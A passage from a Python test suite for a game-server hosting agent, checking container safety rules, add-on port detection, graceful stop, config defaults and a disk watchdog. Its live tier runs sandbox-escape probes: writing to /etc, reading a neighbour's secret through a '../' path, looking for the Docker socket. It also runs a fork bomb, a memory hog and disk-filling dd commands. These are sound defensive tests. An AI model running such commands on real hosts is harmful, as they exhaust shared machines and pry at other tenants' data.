            ok = True
        check(f"assert_safe refuses {label}", ok)
    # memory_mode = "soft": an explicit setting, off by default, tested both ways.
    soft_spec = copy.deepcopy(spec)
    for k in ("Memory", "MemorySwap"):
        soft_spec["HostConfig"].pop(k)
    soft_spec["HostConfig"]["MemoryReservation"] = 2560 * mib
    try:
        assert_safe(soft_spec, cfg, folder)
        ok = False
    except UnsafeSpec:
        ok = True
    check("assert_safe refuses a reservation with no hard limit on a default node", ok)
    soft_cfg = docker_cfg(memory_mode="soft")
    built = container_spec(server, soft_cfg, folder)["HostConfig"]
    try:
        assert_safe(container_spec(server, soft_cfg, folder), soft_cfg, folder)
        ok = True
    except UnsafeSpec as e:
        ok = str(e)
    check("...and allows one where agent.toml says memory_mode = \"soft\", which builds it",
          ok is True and built.get("MemoryReservation") == 2560 * mib
          and "Memory" not in built and "MemorySwap" not in built, (ok, built))
    for label, mutate in [("unlimited swap", hcset("MemorySwap", -1)),
                          ("no reservation either", hcset("MemoryReservation", 0))]:
        bad = copy.deepcopy(soft_spec)
        mutate(bad)
        try:
            assert_safe(bad, soft_cfg, folder)
            ok = False
        except UnsafeSpec:
            ok = True
        check(f"...but even then refuses {label}", ok)
    try:
        assert_safe(spec, soft_cfg, folder)
        ok = True
    except UnsafeSpec as e:
        ok = str(e)
    check("...and a hard limit is still fine on a soft node", ok is True, ok)
    for label, f in [("a folder outside the servers root", pathlib.PurePosixPath("/etc")),
                     ("a folder that climbs out with ..",
                      pathlib.PurePosixPath("/srv/blessforge/servers/../../../etc")),
                     ("the Docker socket's folder", pathlib.PurePosixPath("/var/run"))]:
        bad = copy.deepcopy(spec)
        bad["HostConfig"]["Binds"] = [f"{f}:/server:rw"]
        try:
            assert_safe(bad, cfg, f)
            ok = False
        except UnsafeSpec:
            ok = True
        check(f"assert_safe refuses {label}", ok)


def test_addons():
    section("11. add-on ports: found, published, and nothing else")
    cfg = docker_cfg()
    folder = cfg.server_dir(A_ID)
    server = {"uuid": A_ID, "port": 25565, "java_major": 21, "memory_mb": 2048,
              "execution_command": "java -jar server.jar nogui",
              "addon_ports": [{"port": 24454, "proto": "udp", "what": "Voice"},
                              {"port": 8123, "proto": "tcp", "what": "Dynmap"},
                              {"port": 25565, "proto": "udp", "what": "query"}]}
    spec = container_spec(server, cfg, folder)
    pb = spec["HostConfig"]["PortBindings"]
    try:
        assert_safe(spec, cfg, folder)
        ok = True
    except UnsafeSpec as e:
        ok = str(e)
    check("add-on ports are published next to the game port, and pass the check",
          ok is True and sorted(pb) == ["24454/udp", "25565/tcp", "25565/udp", "8123/tcp"]
          and sorted(spec["ExposedPorts"]) == sorted(pb), (ok, sorted(pb)))
    check("...each on the game address, on the same number on both sides",
          all(b == [{"HostIp": "10.8.0.2", "HostPort": k.split("/")[0]}]
              for k, b in pb.items()))

    box = TMP / "addons"
    (box / "mods").mkdir(parents=True)
    (box / "config" / "voicechat").mkdir(parents=True)
    (box / "config" / "Geyser-NeoForge").mkdir(parents=True)
    (box / "config" / "voicechat" / "voicechat-server.properties").write_text(
        "# Simple Voice Chat server config\nport=24460\nbind_address=\n")
    (box / "config" / "Geyser-NeoForge" / "config.yml").write_text(
        "bedrock:\n  address: 0.0.0.0\n  # The port\n  port: 19140\n"
        "  clone-remote-port: false\nremote:\n  port: 25565\n")
    (box / "mods" / "Dynmap-3.7-beta-6-neoforge-1.21.jar").write_bytes(b"jar")
    (box / "mods" / "bluemap-5.4-neoforge.jar").write_bytes(b"jar")
    (box / "dynmap").mkdir()
    (box / "dynmap" / "configuration.txt").write_text(
        "deftemplatesuffix: lowres\nwebserver-port: 8124\n")
    (box / "server.properties").write_text(
        "server-port=25565\nenable-query=true\nquery.port=25570\n"
        "enable-rcon=true\nrcon.port=25575\n")
    found = {(a["port"], a["proto"]): a["what"] for a in addons.detect(box, 25565)}
    check("a port an add-on's config names is the one published",
          found.get((24460, "udp")) == "Simple Voice Chat"
          and found.get((19140, "udp")) == "Geyser (Bedrock players)"
          and found.get((8124, "tcp")) == "Dynmap", found)
    check("an add-on that has not run yet gets its default port (BlueMap 8100)",
          found.get((8100, "tcp")) == "BlueMap", found)
    check("a separate query port is published; RCON never is",
          (25570, "udp") in found and not any(p == 25575 for p, _ in found), found)
    check("Geyser's `remote` port (the Java server) is not mistaken for its own",
          (25565, "tcp") not in found and (25565, "udp") not in found, found)

    (box / "config" / "voicechat" / "voicechat-server.properties").write_text("port=-1\n")
    (box / "dynmap" / "configuration.txt").write_text(
        "disable-webserver: true\nwebserver-port: 8124\n")
    found = {(a["port"], a["proto"]) for a in addons.detect(box, 25565)}
    check("Voice Chat on the game port, and a switched-off Dynmap, publish nothing",
          not any(p in (24454, 24460, 8123, 8124) for p, _ in found), found)

    # A config that is a link out of the folder is not followed.
    (OUTSIDE / "voicechat-server.properties").write_text("port=31337\n")
    target = box / "config" / "voicechat" / "voicechat-server.properties"
    target.unlink()
    kind = make_link(target, OUTSIDE / "voicechat-server.properties", folder=False)
    if kind:
        found = {a["port"] for a in addons.detect(box, 25565)}
        check(f"a config that is a {kind} out of the folder is not read",
              31337 not in found, found)
    (OUTSIDE / "voicechat-server.properties").unlink()

    check("Docker's 'already allocated' error names the port",
          port_in_use("driver failed programming external connectivity on endpoint "
                      "bf-x (abc): Bind for 0.0.0.0:8123 failed: port is already "
                      "allocated") == 8123)
    check("...and so does a program on the host holding it",
          port_in_use("Error starting userland proxy: listen udp4 0.0.0.0:19132: "
                      "bind: address already in use") == 19132)
    check("...and any other failure is not mistaken for one",
          port_in_use("OCI runtime create failed: no such file") is None)


async def test_graceful_stop():
    """Stop is `stop` on the console, then a wait -- the signal only after.

    Found on a real Docker node: Docker's own stop sends SIGTERM at once, and
    sending it straight after `stop` raced the two; Paper took the signal.
    """
    section("8b. a Docker server is stopped by its own `stop` first")
    from agent import containers

    calls = []

    class FakeDocker:
        def __init__(self, *_a, **_k):
            pass

        async def __aenter__(self):
            return self

        async def __aexit__(self, *_exc):
            return False

        async def post(self, url, **kw):
            calls.append((url, kw.get("params")))

    class Writer:
        def __init__(self, on_line):
            self.written, self.on_line = b"", on_line

        def write(self, data):
            self.written += data
            self.on_line(data.decode().strip())

        async def drain(self):
            pass

    real = containers._docker_client
    containers._docker_client = FakeDocker
    try:
        # A server that saves and exits half a second after `stop`.
        exited = asyncio.Event()
        loop = asyncio.get_running_loop()
        writer = Writer(lambda ln: ln == "stop" and loop.call_later(0.5, exited.set))
        pump = asyncio.create_task(exited.wait())
        running = containers.DockerRunning(type("RT", (), {"cfg": None})(), "bf-x",
                                           writer, pump)
        await running.stop(timeout=10)
        check("`stop` goes to the server's console first", writer.written == b"stop\n")
        check("...and a server that exits by itself never gets Docker's stop (no signal)",
              calls == [], calls)

        # A server that ignores `stop`.
        calls.clear()
        hung = asyncio.create_task(asyncio.Event().wait())
        running = containers.DockerRunning(type("RT", (), {"cfg": None})(), "bf-y",
                                           Writer(lambda ln: None), hung)
        t0 = time.time()
        await running.stop(timeout=1)
        check("one that does not exit gets Docker's stop only after the timeout",
              calls == [("/containers/bf-y/stop", {"t": 10})] and time.time() - t0 >= 1,
              calls)
        check("...and waiting did not cancel the console pump", not hung.cancelled())
        hung.cancel()
    finally:
        containers._docker_client = real


# --- 9. config ------------------------------------------------------------------------


def test_config():
    section("9. config")
    base = (f'[agent]\nnode_id = "n"\ntoken_id = "t"\ntoken = "x"\n'
            f'panel_url = "http://p"\npanel_public_key = """{PUB}"""\n')
    p = TMP / "c.toml"
    p.write_text(base + 'runtime = "process"\n', encoding="utf-8")
    try:
        load(p)
        ok = False
    except ValueError as e:
        ok = "NO isolation" in str(e)
    check("the process runtime (no isolation) is refused unless explicitly allowed", ok)
    p.write_text(base + 'privileged = true\n', encoding="utf-8")
    try:
        load(p)
        ok = False
    except ValueError as e:
        ok = "unknown" in str(e)
    check("an unknown setting is refused, not ignored", ok)
    p.write_text(base, encoding="utf-8")
    cfg = load(p)
    check("the defaults are the safe ones",
          cfg.runtime == "docker" and cfg.game_network == "bridge" and cfg.pids_limit > 0
          and cfg.verify_panel_tls and not cfg.allow_unsafe_process_runtime
          and cfg.memory_mode == "hard")
    p.write_text(base + 'memory_mode = "none"\n', encoding="utf-8")
    try:
        load(p)
        ok = False
    except ValueError as e:
        ok = "memory_mode" in str(e)
    check("a memory mode other than hard or soft is refused", ok)
    p.write_text(base + 'memory_mode = "soft"\n', encoding="utf-8")
    check("memory_mode = \"soft\" is read when it is asked for", load(p).memory_mode == "soft")
    try:
        ProcessRuntime(cfg)
        ok = False
    except RuntimeError_:
        ok = True
    check("the process runtime refuses to be built without the flag, too", ok)


# --- 10. the disk watchdog ------------------------------------------------------------


async def test_disk():
    section("10. the disk watchdog")
    from agent.servers import Supervisor

    class Events:
        def __init__(self):
            self.seen = []

        def emit(self, kind, server=None, **data):
            self.seen.append((kind, server, data))

    cfg = AgentConfig(node_id=NODE, token_id="t", token="t", panel_url="http://x",
                      panel_public_key=PUB, servers_root=TMP / "disk-servers",
                      state_dir=TMP / "disk-state", runtime="process",
                      allow_unsafe_process_runtime=True, stop_timeout=10)
    ev = Events()
    sup = Supervisor(cfg, ProcessRuntime(cfg), ev)
    sid = str(uuidlib.uuid4())
    filler = ("import sys\nopen('fill.bin','wb').write(b'\\0' * 3 * 1048576)\n"
              "print('filled', flush=True)\nfor line in sys.stdin:\n"
              "    if line.strip() == 'stop': break\n")
    sup.put(sid, {"port": 30100, "execution_command": f'"{sys.executable}" -u filler.py',
                  "limits": {"disk_mb": 1}})
    (sup.folder(sid) / "filler.py").write_text(filler)
    await sup.power(sid, "start")
    for _ in range(100):
        if (sup.folder(sid) / "fill.bin").exists() and \
                (sup.folder(sid) / "fill.bin").stat().st_size >= 3 * 1048576:
            break
        await asyncio.sleep(0.1)
    stopped = await sup.check_disks()
    for _ in range(100):
        if sup.get(sid).running is None:
            break
        await asyncio.sleep(0.1)
    check("a server past its disk limit is stopped",
          stopped == [sid] and sup.get(sid).running is None, sup.get(sid).state)
    check("...and the panel is told why", any(k == "disk_full" for k, *_ in ev.seen))
    check("...and its console says so",
          any("disk" in ln for ln in sup.get(sid).console.lines))


# --- the live tier: real containers trying to get out --------------------------------


async def test_live():
    section("LIVE: real containers (Docker)")
    from agent.containers import DockerRuntime, _docker_client
    images = {int(k): v for k, v in json.loads(os.environ.get("BF_TEST_IMAGES", "{}")).items()}
    cfg = AgentConfig(node_id="live", token_id="t", token="t", panel_url="http://x",
                      panel_public_key=PUB, servers_root=TMP / "live",
                      state_dir=TMP / "live-state", game_bind_ip="127.0.0.1",
                      pids_limit=128, **({"images": images} if images else {}))
    rt = DockerRuntime(cfg)
    print("docker:", await rt.info())

    async def run(command: str, memory_mb=256, seconds=60, uid=None) -> tuple[int | None, list[str], dict]:
        sid = str(uuidlib.uuid4())
        folder = cfg.server_dir(sid)
        folder.mkdir(parents=True)
        if hasattr(os, "chown") and os.geteuid() == 0:
            os.chown(folder, cfg.container_uid, cfg.container_gid)
        else:
            folder.chmod(0o777)
        (folder / "probe.txt").write_text("own file")
        lines, done = [], asyncio.get_running_loop().create_future()

        async def on_exit(code):
            if not done.done():
                done.set_result(code)
        server = {"uuid": sid, "port": 40000 + int(sid[:3], 16) % 9000, "java_major": 21,
                  "memory_mb": memory_mb, "execution_command": command}
        running = await rt.start(server, folder, lines.append, on_exit)
        try:
            code = await asyncio.wait_for(done, seconds)
        except asyncio.TimeoutError:
            await running.kill()
            code = await asyncio.wait_for(done, 30)
        async with _docker_client(cfg) as c:
            inspect = (await c.get(f"/containers/{rt.container(sid)}/json")).json()
        await rt.remove(sid)
        return code, lines, inspect

    # a neighbour with a secret, at the path a container would guess
    neighbour = cfg.server_dir(str(uuidlib.uuid4()))
    neighbour.mkdir(parents=True)
    (neighbour / "secret.txt").write_text("NEIGHBOUR SECRET")

    probe = " ; ".join([
        "echo uid=$(id -u)",
        "touch /etc/pwned 2>/dev/null && echo ROOTFS-WRITABLE || echo ROOTFS-RO",
        "touch /tmp/x && echo TMP-OK",
        "cp /bin/true /tmp/t 2>/dev/null; /tmp/t 2>/dev/null && echo TMP-EXEC || echo TMP-NOEXEC",
        "ls /var/run/docker.sock /run/docker.sock 2>/dev/null && echo SOCKET || echo NO-SOCKET",
        f"cat /server/../{neighbour.name}/secret.txt 2>/dev/null || echo NO-NEIGHBOUR",
        "ls /server",
        "grep CapEff /proc/self/status",
        "grep NoNewPrivs /proc/self/status",
    ])
    code, lines, _ = await run(f"sh -c '{probe}'")
    out = "\n".join(lines)
    check("LIVE runs as uid 1000, not root", "uid=1000" in out, out[-400:])
    check("LIVE the root filesystem is read-only", "ROOTFS-RO" in out)
    check("LIVE /tmp is writable but nothing in it can be executed",
          "TMP-OK" in out and "TMP-NOEXEC" in out)
    check("LIVE there is no Docker socket inside", "NO-SOCKET" in out)
    check("LIVE another server's folder is not reachable",
          "NO-NEIGHBOUR" in out and "NEIGHBOUR SECRET" not in out)
    check("LIVE the only thing at /server is its own folder", "probe.txt" in out)
    check("LIVE no effective capabilities", "CapEff:\t0000000000000000" in out)
    check("LIVE no new privileges", "NoNewPrivs:\t1" in out)

    code, lines, inspect = await run("sh -c 'head -c 2000m /dev/zero | tail'",
                                     memory_mb=256, seconds=120)
    check("LIVE a memory hog is killed at its limit, not the node's",
          inspect["State"]["OOMKilled"] or code == 137, (code, inspect["State"]))

    host_ok = []

    async def host_probe():
        await asyncio.sleep(8)
        host_ok.append(subprocess.run([sys.executable, "-c", "print(1)"],
                                      capture_output=True, timeout=20).returncode == 0)
    bomb = "sh -c 'i=0; while [ $i -lt 5000 ]; do sleep 60 & i=$((i+1)); done; wait'"
    probe_task = asyncio.create_task(host_probe())
    code, lines, inspect = await run(bomb, seconds=15)
    await probe_task
    check("LIVE a fork bomb stops at the PID limit and the node can still fork",
          host_ok == [True] and any("fork" in ln.lower() or "resource" in ln.lower()
                                    for ln in lines), lines[-3:])

    # 768 MB, not the 256 the others get: /tmp is tmpfs, and tmpfs pages
    # count against the container's memory limit, so a 256 MB container
    # filling a 256 MB /tmp is OOM-killed before it ever sees ENOSPC.
    code, lines, _ = await run(
        "sh -c 'dd if=/dev/zero of=/fill bs=1M count=50 2>&1; "
        "dd if=/dev/zero of=/tmp/fill bs=1M count=400 2>&1; echo DONE'",
        memory_mb=768, seconds=60)
    out = "\n".join(lines)
    check("LIVE the root filesystem cannot be filled, and /tmp stops at its size",
          "Read-only file system" in out and "No space left" in out, out[-300:])


async def main():
    setup()
    test_paths()
    test_links()
    test_races()
    test_concurrent_folders()
    test_hard_links()
    test_archives()
    test_tokens()
    section("6b. the panel's half of the tokens")
    await test_panel_side()
    test_api()
    test_containers()
    test_addons()
    await test_graceful_stop()
    test_config()
    await test_disk()
    if LIVE:
        await test_live()
    else:
        print("\n(the Docker tier was not run; add --live on a Linux node with Docker)")
    passed = sum(results)
    print(f"\n{passed}/{len(results)} checks passed "
          f"({'openat/O_NOFOLLOW' if files.SAFE_FDS else 'Windows handle-check'} jail)")
    return passed == len(results)


if __name__ == "__main__":
    ok = asyncio.run(main())
    shutil.rmtree(TMP, ignore_errors=True)
    sys.exit(0 if ok else 1)
